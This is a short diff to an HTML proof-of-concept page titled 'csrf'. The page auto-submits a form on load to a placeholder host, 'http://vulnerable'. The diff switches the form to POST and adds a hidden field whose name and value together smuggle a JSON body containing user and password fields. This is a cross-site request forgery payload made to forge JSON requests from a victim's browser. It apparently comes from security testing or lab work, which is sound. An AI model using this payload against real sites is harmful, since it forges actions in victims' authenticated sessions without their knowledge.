@@ -1,7 +1,8 @@
 <html>
 <head><title>csrf</title></head>
 <body onLoad="document.forms[0].submit()">
-<form action="http://vulnerable" method="GET">
+<form action="http://vulnerable" method="POST">
+<input type='hidden' name='{"user":"test","password":"test", "z":"' value='"}'>
 </form>
 </body>
 </html>
